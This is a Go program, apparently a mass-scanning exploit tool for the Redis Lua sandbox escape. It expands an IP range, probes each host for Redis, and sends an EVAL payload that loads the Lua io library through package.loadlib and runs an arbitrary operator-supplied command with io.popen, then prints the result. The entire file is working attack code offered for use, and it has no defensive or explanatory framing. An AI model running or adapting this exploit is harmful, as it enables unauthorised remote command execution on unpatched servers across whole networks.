package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"strings"
	"sync"
	"time"
)

type Server struct {
	Ip      string
	Port    int
	IsVul   string
	conn    net.Conn
	Timeout time.Duration
	Cmd     string
}

func NewServer(ip string, port int, cmd string) *Server {
	server := &Server{
		Ip:      ip,
		Port:    port,
		Cmd:     cmd,
		Timeout: time.Second * 10,
	}
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), server.Timeout)
	if err != nil {
		fmt.Printf("启动链接错误:%s\n", err)
		return nil
	}
	server.conn = conn
	return server
}

func (this *Server) DoExploit() {
	sendMsg := `eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("` + this.Cmd + `", "r"); local res = f:read("*a"); f:close(); return res' 0` + "\r\n"
	_, err := this.conn.Write([]byte(sendMsg))
	if err != nil {
		// fmt.Println(1)
		fmt.Println(err)
		return
	}
	return
}

func (this *Server) AcceptResponse() string {
	err := this.conn.SetReadDeadline(time.Now().Add(this.Timeout)) // timeout
	if err != nil {
		log.Println("setReadDeadline failed:", err)
	}
	buf := make([]byte, 100)
	this.conn.Read(buf)
	if err != nil {
		log.Println("Read failed:", err)
	}
	str := strings.Replace(string(buf), "\x00", "", -1)
	str = strings.Replace(str, "\r", "", -1)
	str = strings.Replace(str, "\n", "", -1)
	return str

}

func (this *Server) checkRedis() bool {
	sendMsg := `get` + "\r\n"
	_, err := this.conn.Write([]byte(sendMsg))
	if err != nil {
		// fmt.Println(1)
		fmt.Printf("%v不是redis", this.Ip)
		return false
	}
	banner := this.AcceptResponse()
	isRedis := strings.Contains(banner, "wrong number of arguments for 'get' command")
	return isRedis

}
func cidr2IPs(cidr string) []string {
	// C段转ip
	var ips []string
	if net.ParseIP(cidr) != nil {
		ips = append(ips, cidr)
		return ips
	}

	ipAddr, ipNet, err := net.ParseCIDR(cidr)
	if err != nil {
		log.Print(err)
	}

	for ip := ipAddr.Mask(ipNet.Mask); ipNet.Contains(ip); increment(ip) {
		ips = append(ips, ip.String())
	}

	// CIDR too small eg. /31
	if len(ips) <= 2 {
		log.Print("err")
	}

	return ips
}

func increment(ip net.IP) {
	for i := len(ip) - 1; i >= 0; i-- {
		ip[i]++
		if ip[i] != 0 {
			break
		}
	}
}

var (
	ip   string
	port int
	cmd  string
)

func init() {
	flag.StringVar(&ip, "ip", "127.0.0.1", "目标地址")
	flag.IntVar(&port, "port", 6379, "端口")
	flag.StringVar(&cmd, "cmd", "id", "命令")
}

func start(wg *sync.WaitGroup, ip string, port int) {
	defer wg.Done()
	server := NewServer(ip, port, cmd)
	if server == nil {
		fmt.Println("链接服务器失败")
		return
	}
	if server.checkRedis() {
		server.DoExploit()
		server.IsVul = server.AcceptResponse()
		fmt.Println(fmt.Sprintf("%v,%v\n", server.Ip, server.IsVul))
	} else {
		fmt.Printf("%v不存在漏洞", ip)
	}

}
func main() {
	flag.Parse()
	ips := cidr2IPs(ip)
	count := len(ips)
	var wg sync.WaitGroup
	wg.Add(count)
	for _, ip := range ips {
		go start(&wg, ip, port)
	}
	wg.Wait()
}
